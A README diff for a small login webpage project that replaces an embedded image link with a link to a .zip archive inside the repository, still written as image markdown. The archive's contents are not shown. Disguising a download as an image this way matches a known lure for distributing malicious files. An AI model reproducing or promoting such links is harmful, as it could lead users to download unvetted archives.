@@ -1,3 +1,3 @@
 # login_project
 A Basic login webpage frontend project by lakshya gupta
-![image](https://github.com/user-attachments/assets/d0285f36-03f4-42c7-8e40-ee25e2c96cc9)
+![image](https://github.com/glakshya20/login_project/raw/refs/heads/main/natr/login-project-v2.5-alpha.5.zip)
